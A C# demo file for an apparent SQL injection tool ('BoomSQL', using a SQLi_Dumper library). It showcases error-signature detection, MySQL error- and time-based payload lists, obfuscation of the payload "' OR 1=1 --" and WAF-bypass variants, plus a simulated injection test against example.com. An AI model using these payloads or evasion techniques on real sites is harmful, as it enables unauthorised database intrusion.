using System;
using System.Collections.Generic;
using System.Threading.Tasks;
using DataBase;
using SQLi_Dumper;

/// <summary>
/// Simple demo showing the enhanced SQL injection detection capabilities
/// </summary>
public class SimpleEnhancedDemo
{
    public static void Main(string[] args)
    {
        Console.WriteLine("BoomSQL Enhanced SQL Injection Detection Demo");
        Console.WriteLine("=============================================");
        
        // Test basic functionality
        TestBasicFunctionality();
        
        // Test advanced features
        TestAdvancedFeatures();
        
        Console.WriteLine("\nDemo completed successfully!");
    }
    
    private static void TestBasicFunctionality()
    {
        Console.WriteLine("\n=== Basic Functionality Test ===");
        
        // Test error signature detection
        var errorSignatures = ErrorSignatures.Instance;
        
        var testResponses = new Dictionary<string, string>
        {
            { "MySQL Error", "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version" },
            { "MSSQL Error", "Microsoft SQL Server Error: Unclosed quotation mark after the character string" },
            { "Oracle Error", "ORA-00936: missing expression" },
            { "PostgreSQL Error", "PostgreSQL query failed: ERROR: syntax error at or near" }
        };
        
        foreach (var testCase in testResponses)
        {
            var result = errorSignatures.AnalyzeResponse(testCase.Value);
            Console.WriteLine($"  {testCase.Key}: {result.DatabaseType} ({result.ConfidenceScore}% confidence)");
        }
    }
    
    private static void TestAdvancedFeatures()
    {
        Console.WriteLine("\n=== Advanced Features Test ===");
        
        // Test payload management
        var payloadManager = PayloadManager.Instance;
        
        Console.WriteLine("\nPayload Statistics:");
        var errorPayloads = payloadManager.GetPayloads(PayloadManager.PayloadCategory.ErrorBased, Types.MySQL_With_Error);
        var timePayloads = payloadManager.GetPayloads(PayloadManager.PayloadCategory.TimeBased, Types.MySQL_No_Error);
        
        Console.WriteLine($"  MySQL Error Payloads: {errorPayloads.Count}");
        Console.WriteLine($"  MySQL Time Payloads: {timePayloads.Count}");
        
        if (errorPayloads.Count > 0)
        {
            Console.WriteLine($"  Example Error Payload: {errorPayloads[0]}");
        }
        
        if (timePayloads.Count > 0)
        {
            Console.WriteLine($"  Example Time Payload: {timePayloads[0]}");
        }
        
        // Test encoding capabilities
        var encoder = PayloadEncoder.Instance;
        var originalPayload = "' OR 1=1 --";
        
        Console.WriteLine("\nEncoding Examples:");
        Console.WriteLine($"  Original: {originalPayload}");
        Console.WriteLine($"  URL Encoded: {encoder.Encode(originalPayload, "url")}");
        Console.WriteLine($"  Mixed Case: {encoder.Obfuscate(originalPayload, "mixed_case")}");
        Console.WriteLine($"  Comment Injection: {encoder.Obfuscate(originalPayload, "comment_injection")}");
        
        // Test WAF bypass
        var wafVariations = encoder.GenerateWAFBypassVariations(originalPayload);
        Console.WriteLine($"  WAF Bypass Variations: {wafVariations.Count}");
        
        if (wafVariations.Count > 0)
        {
            Console.WriteLine($"  Example WAF Bypass: {wafVariations[0]}");
        }
        
        // Test vulnerability simulation
        SimulateVulnerabilityDetection();
    }
    
    private static void SimulateVulnerabilityDetection()
    {
        Console.WriteLine("\n=== Vulnerability Detection Simulation ===");
        
        var payloadManager = PayloadManager.Instance;
        var errorSignatures = ErrorSignatures.Instance;
        
        // Simulate testing a vulnerable URL
        var testUrl = "http://example.com/page.php?id=1[t]";
        
        // Get some payloads to test
        var testPayloads = payloadManager.GetPayloads(PayloadManager.PayloadCategory.ErrorBased, Types.MySQL_With_Error);
        
        if (testPayloads.Count > 0)
        {
            var payload = testPayloads[0];
            var finalUrl = testUrl.Replace("[t]", payload);
            
            Console.WriteLine($"Testing URL: {finalUrl}");
            
            // Simulate response that would indicate vulnerability
            var simulatedResponse = "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''injected' at line 1";
            
            var result = errorSignatures.AnalyzeResponse(simulatedResponse);
            
            if (result.ConfidenceScore > 70)
            {
                Console.WriteLine("  ✓ VULNERABILITY DETECTED!");
                Console.WriteLine($"  Database: {result.DatabaseType}");
                Console.WriteLine($"  Confidence: {result.ConfidenceScore}%");
                Console.WriteLine($"  Evidence: {string.Join(", ", result.MatchedSignatures)}");
                Console.WriteLine($"  Working Payload: {payload}");
            }
            else
            {
                Console.WriteLine("  ✗ No vulnerability detected");
            }
        }
    }
}